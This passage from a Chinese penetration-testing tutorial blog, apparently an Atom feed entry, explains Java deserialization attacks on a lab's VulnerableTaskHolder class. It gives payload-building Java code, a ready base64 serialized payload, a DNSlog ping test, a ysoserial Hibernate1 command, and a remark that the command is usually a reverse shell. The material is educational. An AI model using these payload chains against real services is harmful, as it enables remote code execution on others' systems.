class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> ((line = in.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">          log.info(line);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        log.error(<span class="string">&quot;IO Exception&quot;</span>, e);</span><br><span class="line">&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>执行Runtime.getRuntime().exec(taskAction); 所以把攻击的恶意代码写到 taskAction 类中，所以构造payload的java文件（目录为src文件夹中，org.dummy.insecure.framework文件夹下的Main文件）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.dummy.insecure.framework;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">VulnerableTaskHolder</span> <span class="variable">vulnerableTaskHolder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VulnerableTaskHolder</span>(<span class="string">&quot;ping&quot;</span>, <span class="string">&quot;ping -n 6 127.0.0.1&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        outputStream.writeObject(vulnerableTaskHolder);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(str);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后把VulnerableTaskHolder.java也弄到这里去：目录为src文件夹中，org.dummy.insecure.framework文件夹下，注意删掉错误的部分。运行即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXNyADFvcmcuZHVtbXkuaW5zZWN1cmUuZnJhbWV3b3JrLlZ1bG5lcmFibGVUYXNrSG9sZGVyAAAAAAAAAAICAANMABZyZXF1ZXN0ZWRFeGVjdXRpb25UaW1ldAAZTGphdmEvdGltZS9Mb2NhbERhdGVUaW1lO0wACnRhc2tBY3Rpb250ABJMamF2YS9sYW5nL1N0cmluZztMAAh0YXNrTmFtZXEAfgACeHBzcgANamF2YS50aW1lLlNlcpVdhLobIkiyDAAAeHB3DgUAAAfnBgYRFBgzn0lIeHQAE3BpbmcgLW4gNiAxMjcuMC4wLjF0AARwaW5n</span><br></pre></td></tr></table></figure><p>所以我们要构造的恶意代码应该遵循：<strong>恶意命令→序列化→base64→rO0AB格式字符串【最终Payload】</strong></p><p>当然，我们可以使用DNSlog测试：<code>VulnerableTaskHolder vuln = new VulnerableTaskHolder(&quot;qwq&quot;,&quot;ping ***.dnslog.cn&quot;);</code></p><blockquote><p>这个恶意命令一般是反弹shell，因为考虑到有的不回显。</p></blockquote><h4 id="ysoserial"><a class="markdownIt-Anchor" href="#ysoserial"></a> ysoserial</h4><p>可以看到里面有很多组件，选择其中的一个，然后通过他给出的指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Usage: java -jar ysoserial-[version]-all.jar [payload] &#x27;[command]&#x27;</span><br></pre></td></tr></table></figure><p>我们找到需要的组件，然后生成即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar .\ysoserial.jar Hibernate1 calc.exe &gt; payload.bin</span><br></pre></td></tr></table></figure><h1 id="php反序列化"><a class="markdownIt-Anchor" href="#php反序列化"></a> PHP反序列化</h1><p>PHP反序列化不是本章的重点，所以浅浅说一下，这里面的序列化结构如下：</p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/1685949580662.png" alt="1685949580662" style="zoom:67%;" /><p>具体可以参考如下导图做简单的复习：</p><p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="PHP反序列化" /></p><p>参考：</p><ol><li><a href="https://xz.aliyun.com/t/12507#toc-11">https://xz.aliyun.com/t/12507#toc-11</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;java反序列化&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#java反序列化&quot;&gt;&lt;/a&gt; JAVA反序列化&lt;/h1&gt;
&lt;h2 id=&quot;概念&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概念&quot;&gt;&lt;/a&gt; </summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="反序列化" scheme="https://j3f5.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
</feed>
